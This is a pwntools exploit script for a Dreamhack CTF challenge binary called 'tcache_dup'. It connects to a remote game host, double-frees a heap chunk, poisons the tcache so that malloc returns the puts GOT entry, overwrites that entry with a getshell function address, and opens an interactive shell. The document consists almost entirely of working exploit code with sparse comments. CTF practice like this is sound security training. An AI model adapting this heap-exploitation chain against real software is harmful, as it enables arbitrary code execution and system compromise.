from pwn import *
elf =  ELF("./tcache_dup_patched")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:11267'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#tcache dup = fastbin dup?
#ptr table bss 6010C0
#gdb.attach(p)

#create a
p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.sendline(b"AAAA")


#free a
p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"0")

#double free a direct merge; libc ver no verificare

#free a
p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"0")

getshell = 0x400Ab0

#--------
#malloc a

p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.send(p64(elf.got[b'puts']) + b"\x00"*16)

#we have getshell func
#overwrite puts@got with getshell

#malloc inside the 'a' chunk again, for its FD to become te next head

p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.send(b"HI"*12)


#now head of tcache bins at puts

#--------
#malloc malicious

p.recvuntil(b"> ")
p.sendline(b"1")

#size
p.recvuntil(b": ")
p.sendline(b"24")

#data
p.recvuntil(b": ")
p.send(p64(getshell))

p.interactive()
